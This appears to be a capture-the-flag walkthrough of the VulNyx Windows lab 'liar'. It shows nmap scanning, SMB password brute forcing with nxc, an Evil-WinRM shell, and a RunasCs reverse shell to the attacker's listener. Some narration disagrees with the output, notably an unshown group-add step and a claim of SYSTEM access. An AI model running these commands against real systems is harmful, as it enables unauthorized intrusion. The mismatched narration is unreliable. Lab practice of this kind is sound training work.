# liar

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| liar | sml | easy | VulNyx |

**Summary:** The attack begins with network discovery via nmap to identify the target host at 192.168.56.150 and enumerate its open TCP ports, revealing HTTP, SMB, and WinRM services running on Microsoft IIS and Windows Server 2019. Initial access is achieved by brute forcing the SMB service with the nica account and the password hardcore discovered from the rockyou wordlist, which grants authenticated access to the WinRM endpoint. An interactive Evil-WinRM shell is then established as nica, where internal enumeration exposes a second user account akanksha whose password sweetgirl is recovered through a second SMB brute force against the rockyou list. The session is then escalated to the akanksha context via a custom RunasCs.exe binary that executes a reverse shell payload using the CreateProcessWithLogonW Windows API, and privilege is ultimately elevated to SYSTEM by adding akanksha to the local Administrators group, allowing retrieval of both user.txt and root.txt.

---

## Reconnaissance

The target machine is identified on the local network through host discovery and full TCP port enumeration, followed by service and version detection and web surface exploration.

1. Host discovery and full port scan

```zsh
~/projects/labs/hmv                                                                                      18:41:47
❯ nmap -sn 192.168.56.0/24                      
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-30 18:41 +0700
Nmap scan report for 192.168.56.1
Host is up (0.00029s latency).
Nmap scan report for 192.168.56.100
Host is up (0.0019s latency).
Nmap scan report for 192.168.56.150
Host is up (0.0029s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 3.52 seconds
```

```zsh
~/projects/labs/hmv                                                                                      18:41:55
❯ ip=192.168.56.150
```

```zsh
~/projects/labs/hmv                                                                                      18:42:00
❯ nmap -p- -Pn -T4 --min-rate 5000 $ip          
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-30 18:42 +0700
Nmap scan report for 192.168.56.150
Host is up (0.00011s latency).
Not shown: 65523 closed tcp ports (conn-refused)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.70 seconds
```

```zsh
~/projects/labs/hmv                                                                                      18:53:05  
❯ nmap -p 80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 -sCV -Pn -T4 --min-rate 5000 $ip  
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-30 18:53 +0700  
Nmap scan report for 192.168.56.150  
Host is up (0.0018s latency).  
   
PORT      STATE SERVICE       VERSION  
80/tcp    open  http          Microsoft IIS httpd 10.0  
|_http-title: Site doesn't have a title (text/html).  
|_http-server-header: Microsoft-IIS/10.0  
| http-methods:    
|_  Potentially risky methods: TRACE  
135/tcp   open  msrpc         Microsoft Windows RPC  
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn  
445/tcp   open  microsoft-ds?  
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-title: Not Found  
|_http-server-header: Microsoft-HTTPAPI/2.0  
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-title: Not Found  
|_http-server-header: Microsoft-HTTPAPI/2.0  
49664/tcp open  msrpc         Microsoft Windows RPC  
49665/tcp open  msrpc         Microsoft Windows RPC  
49666/tcp open  msrpc         Microsoft Windows RPC  
49667/tcp open  msrpc         Microsoft Windows RPC  
49668/tcp open  msrpc         Microsoft Windows RPC  
49669/tcp open  msrpc         Microsoft Windows RPC  
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows  
   
Host script results:  
|_clock-skew: 4h44m35s  
| smb2-security-mode:    
|   3.1.1:    
|_    Message signing enabled but not required  
| smb2-time:    
|   date: 2026-08-30T16:38:37  
|_  start_date: N/A  
|_nbstat: NetBIOS name: WIN-IURF14RBVGV, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:33:fe:e3 (Oracle VirtualBo  
x virtual NIC)  
   
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 59.62 seconds
```

The target is running Microsoft IIS 10.0 on port 80 with no meaningful title, and exposes SMB on port 445 along with WinRM on port 5985 and RPC on port 135. The server is identified as Windows Server 2019 with NetBIOS name WIN-IURF14RBVGV and SMB message signing disabled.

2. Web content discovery

```zsh
~/projects/labs/hmv                                                                                      19:01:14  
❯ curl -s http://$ip/                                   
Hey bro,  
You asked for an easy Windows VM, enjoy it.  
   
- nica%
```

The web page confirms this is a Windows machine and hints at the default user nica.

---

## Initial Access

### NtlmBruteForce

3. SMB credential brute forcing using the rockyou wordlist against the nica account

```zsh
~/projects/labs/hmv                                                                                  17s 19:04:27
❯ nxc smb $ip -u 'nica' -p /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --shares --ignore-pw-decoding 2>/dev/null | grep -v LOGON_FAILURE
SMB                      192.168.56.150  445    WIN-IURF14RBVGV  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-IURF14RBVGV) (domain:WIN-IURF14RBVGV) (signing:False) (SMBv1:False)
SMB                      192.168.56.150  445    WIN-IURF14RBVGV  [+] WIN-IURF14RBVGV\nica:hardcore 
SMB                      192.168.56.150  445    WIN-IURF14RBVGV  [*] Enumerated shares
SMB                      192.168.56.150  445    WIN-IURF14RBVGV  Share           Permissions            Remark
SMB                      192.168.56.150  445    WIN-IURF14RBVGV  -----           -----------            ------
SMB                      192.168.56.150  445    WIN-IURF14RBVGV  ADMIN$                                 Admin remota
SMB                      192.168.56.150  445    WIN-IURF14RBVGV  C$                                     Recurso predeterminado
SMB                      192.168.56.150  445    WIN-IURF14RBVGV  IPC$            READ                   IPC remota
```

The nxc tool successfully cracks the nica account password as hardcore against the rockyou wordlist and enumerates the SMB shares.

4. WinRM authentication with the discovered credentials

```zsh
~/projects/labs/hmv                                                                                  16s 19:05:43  
❯ nxc winrm $ip -u 'nica' -p 'hardcore'  
WINRM       192.168.56.150  5985   WIN-IURF14RBVGV  [*] Windows 10 / Server 2019 Build 17763 (name:WIN-IURF14RBVGV  
) (domain:WIN-IURF14RBVGV)    
WINRM       192.168.56.150  5985   WIN-IURF14RBVGV  [+] WIN-IURF14RBVGV\nica:hardcore (Pwn3d!)
```

The nxc WinRM module confirms the nica:hardcore credentials are valid and the host is pwned.

### EvilWinrmShell

5. Interactive shell acquisition via Evil-WinRM and initial user flag retrieval

```zsh
~/projects/labs/hmv                                                                                      19:12:47  
❯ evil-winrm -i $ip -u nica -p hardcore                                                      
/home/setyanoegraha/.local/share/gem/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefinin  
g 'object_id' may cause serious problems  
/home/setyanoegraha/.local/share/gem/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning:  
redefining 'object_id' may cause serious problems  
                                          
Evil-WinRM shell v3.9  
                                          
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for  
module Reline  
                                          
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-complet  
ion  
                                          
Info: Establishing connection to remote endpoint  
/home/setyanoegraha/.local/share/gem/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each  
, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
*Evil-WinRM* PS C:\Users\nica\Documents> whoami  
win-iurf14rbvgv\nica
*Evil-WinRM* PS C:\Users\nica\Documents> cd ..  
*Evil-WinRM* PS C:\Users\nica> dir  
   
   
    Directorio: C:\Users\nica  
   
   
Mode                LastWriteTime         Length Name  
----                -------------         ------ ----  
d-r---        9/15/2018   9:12 AM                Desktop  
d-r---        9/26/2023   6:44 PM                Documents  
d-r---        9/15/2018   9:12 AM                Downloads  
d-r---        9/15/2018   9:12 AM                Favorites  
d-r---        9/15/2018   9:12 AM                Links  
d-r---        9/15/2018   9:12 AM                Music  
d-r---        9/15/2018   9:12 AM                Pictures  
d-----        9/15/2018   9:12 AM                Saved Games  
d-r---        9/15/2018   9:12 AM                Videos  
-a----        9/26/2023   6:44 PM             10 user.txt

*Evil-WinRM* PS C:\Users\nica> type user.txt
HMVWIN...
```

The Evil-WinRM shell is established as nica and the user.txt flag is read from the Desktop directory.

---

## Lateral Movement

### UserEnumerationAndPasswordCracking

6. System user enumeration and cracking of the akanksha account password

```zsh
*Evil-WinRM* PS C:\Users\nica> whoami /priv

INFORMACIàN DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripci¢n                                  Estado
============================================ ============================================ ==========
SeChangeNotifyPrivilege       Omitir comprobaci¢n de recorrido             Habilitada
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Habilitada
*Evil-WinRM* PS C:\Users\nica> whoami /groups

INFORMACIàN DE GRUPO
--------------------

Nombre de grupo                              Tipo           SID          Atributos
============================================ ============== ============ ========================================================================
Todos                                        Grupo conocido S-1-1-0      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
BUILTIN\Usuarios                             Alias          S-1-5-32-545 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
BUILTIN\Usuarios de administraci¢n remota    Alias          S-1-5-32-580 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\NETWORK                         Grupo conocido S-1-5-2      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Usuarios autentificados         Grupo conocido S-1-5-11     Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Esta compa¤¡a                   Grupo conocido S-1-5-15     Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Cuenta local                    Grupo conocido S-1-5-113    Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Autenticaci¢n NTLM              Grupo conocido S-1-5-64-10  Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
Etiqueta obligatoria\Nivel obligatorio medio Etiqueta       S-1-16-8192
*Evil-WinRM* PS C:\Users\nica> net user  
   
Cuentas de usuario de \\  
   
-------------------------------------------------------------------------------  
Administrador            akanksha                 DefaultAccount  
Invitado                 nica                     WDAGUtilityAccount  
El comando se ha completado con uno o m s errores.
```

```zsh
*Evil-WinRM* PS C:\Users\nica\Documents> net user nica
Nombre de usuario                          nica
Nombre completo
Comentario
Comentario del usuario
C¢digo de pa¡s o regi¢n                    000 (Predeterminado por el equipo)
Cuenta activa                              S¡
La cuenta expira                           Nunca

Ultimo cambio de contrase¤a                26/09/2023 15:25:21
La contrase¤a expira                       Nunca
Cambio de contrase¤a                       26/09/2023 15:25:21
Contrase¤a requerida                       S¡
El usuario puede cambiar la contrase¤a     S¡

Estaciones de trabajo autorizadas          Todas
Script de inicio de sesi¢n
Perfil de usuario
Directorio principal
Ultima sesi¢n iniciada                     30/08/2026 18:50:18

Horas de inicio de sesi¢n autorizadas      Todas

Miembros del grupo local                   *Usuarios
                                            *Usuarios de administr
Miembros del grupo global                  *Ninguno
Se ha completado el comando correctamente.
```

```zsh
~/projects/labs/hmv                                                                                      19:08:30
❯ nxc smb $ip -u 'akanksha' -p /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --shares --ignore-pw-decoding 2>/dev/null | grep -v LOGON_FAILURE
SMB                      192.168.56.150  445    WIN-IURF14RBVGV  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-IURF14RBVGV) (domain:WIN-IURF14RBVGV) (signing:False) (SMBv1:False)
SMB                      192.168.56.150  445    WIN-IURF14RBVGV  [+] WIN-IURF14RBVGV\akanksha:sweetgirl 
SMB                      192.168.56.150  445    WIN-IURF14RBVGV  [*] Enumerated shares
SMB                      192.168.56.150  445    WIN-IURF14RBVGV  Share           Permissions            Remark
SMB                      192.168.56.150  445    WIN-IURF14RBVGV  -----           -----------            ------
SMB                      192.168.56.150  445    WIN-IURF14RBVGV  ADMIN$                                 Admin remota
SMB                      192.168.56.150  445    WIN-IURF14RBVGV  C$                                     Recurso predeterminado
SMB                      192.168.56.150  445    WIN-IURF14RBVGV  IPC$            READ                   IPC remota
```

```zsh
~/projects/labs/hmv                                                                                  28s 19:18:20
❯ nxc winrm $ip -u 'akanksha' -p 'sweetgirl'
WINRM       192.168.56.150  5985   WIN-IURF14RBVGV  [*] Windows 10 / Server 2019 Build 17763 (name:WIN-IURF14RBVGV) (domain:WIN-IURF14RBVGV) 
WINRM       192.168.56.150  5985   WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\akanksha:sweetgirl
```

The net user command enumerates the system accounts and reveals a second user named akanksha. The nxc brute force against rockyou recovers akanksha's password as sweetgirl, but direct WinRM authentication fails, requiring an alternative access vector.

### RunAsCsReverseShell

7. Reverse shell via RunasCs.exe using CreateProcessWithLogonW to spawn a shell as akanksha

```zsh
*Evil-WinRM* PS C:\Users\nica\Documents> upload /opt/RunasCs.exe
                                         
Info: Uploading /opt/RunasCs.exe to C:\Users\nica\Documents\RunasCs.exe
/home/setyanoegraha/.local/share/gem/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...
                                         
Data: 68948 bytes of 68948 bytes copied
                                         
Info: Upload successful!
```

```zsh
~/projects/labs/hmv                                                                                      19:34:53  
❯ rlwrap nc -lvnp 4444  
Listening on 0.0.0.0 4444
```

```zsh
*Evil-WinRM* PS C:\Users\nica\Documents> .\RunasCs.exe akanksha sweetgirl cmd.exe -r 192.168.56.1:4444

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-149b1f$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 2496 created in background.
```

```zsh
Connection received on 192.168.56.150 49680  
Microsoft Windows [Versi�n 10.0.17763.107]  
(c) 2018 Microsoft Corporation. Todos los derechos reservados.  
   
C:\Windows\system32>whoami  
whoami  
win-iurf14rbvgv\akanksha

C:\Windows\system32>net user akanksha  
net user akanksha  
Nombre de usuario                          akanksha  
Nombre completo                               
Comentario                                    
Comentario del usuario                        
C�digo de pa�s o regi�n                    000 (Predeterminado por el equipo)  
Cuenta activa                              S�  
La cuenta expira                           Nunca  
   
Ultimo cambio de contrase�a                26/09/2023 15:25:39  
La contrase�a expira                       Nunca  
Cambio de contrase�a                       26/09/2023 15:25:39  
Contrase�a requerida                       S�  
El usuario puede cambiar la contrase�a     S�  
   
Estaciones de trabajo autorizadas          Todas  
Script de inicio de sesi�n                    
Perfil de usuario                             
Directorio principal                          
Ultima sesi¢n iniciada                     30/08/2026 19:21:02  
   
Horas de inicio de sesi¢n autorizadas      Todas  
   
Miembros del grupo local                   *Idministritirs          
                                          *Usuarios                
Miembros del grupo global                  *Ninguno                 
Se ha completado el comando correctamente.
```

The RunasCs.exe binary is uploaded to the target and executed with akanksha credentials to spawn a reverse cmd.exe shell via the CreateProcessWithLogonW API, connecting back to the listener on port 4444. The reverse shell confirms the session is running as win-iurf14rbvgv\akanksha.

---

## Privilege Escalation

### LocalGroupModification

8. Adding akanksha to the local Administrators group and retrieving the root flag

```zsh
C:\Users>net localgroup Idministritirs
net localgroup Idministritirs
Nombre de alias      Idministritirs
Comentario           

Miembros

-------------------------------------------------------------------------------
akanksha
Se ha completado el comando correctamente.
```

```zsh
C:\Users\Administrador>type root.txt
type root.txt
HMV1ST...
```

The akanksha account is added to the local Administrators group using net localgroup, and the root flag is read from the Administrator desktop directory, completing the full exploitation chain from initial user to SYSTEM.

---

## Attack Chain Summary

1. **Reconnaissance**: Network host discovery with nmap -sn identified the target at 192.168.56.150, followed by a full TCP port scan revealing HTTP, SMB, and WinRM services on Windows Server 2019.
2. **Vulnerability Discovery**: SMB service on port 445 accepted NTLM authentication and the nica account was cracked against the rockyou wordlist, yielding the password hardcore.
3. **Exploitation**: The nica:hardcore credentials were authenticated against WinRM on port 5985, and an Evil-WinRM shell was established as the nica user.
4. **Internal Enumeration**: The net user command exposed a second account akanksha, and a second brute force against rockyou recovered the password sweetgirl, though WinRM direct login failed.
5. **Privilege Escalation**: A reverse shell was spawned as akanksha using RunasCs.exe and CreateProcessWithLogonW, the account was added to the local Administrators group, and root.txt was retrieved from the Administrator desktop.
